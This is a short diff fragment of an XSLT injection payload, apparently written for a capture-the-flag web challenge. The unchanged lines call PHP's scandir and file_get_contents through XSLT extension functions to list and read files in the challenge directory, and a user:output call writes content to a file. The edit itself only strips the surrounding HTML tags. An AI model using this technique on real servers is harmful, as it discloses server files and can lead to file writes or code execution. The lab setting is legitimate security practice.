@@ -18,7 +18,7 @@
 		<xsl:value-of select="user:output(string(filename),string(content))"/>
   	</xsl:template>
 </xsl:stylesheet>
-<html><body>
+
 <xsl:variable  name="scand"   select="php:functionString('scandir','/challenge/web-serveur/ch50')" />
 <xsl:variable  name="strscand" select="user:output('/challenge/web-serveur/ch50/index.php','$scand')" /> 
 <xsl:variable  name="header"  select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')"/>
@@ -43,5 +43,3 @@
 </span>
 </p>
 </div>
-      </body>      
-</html>
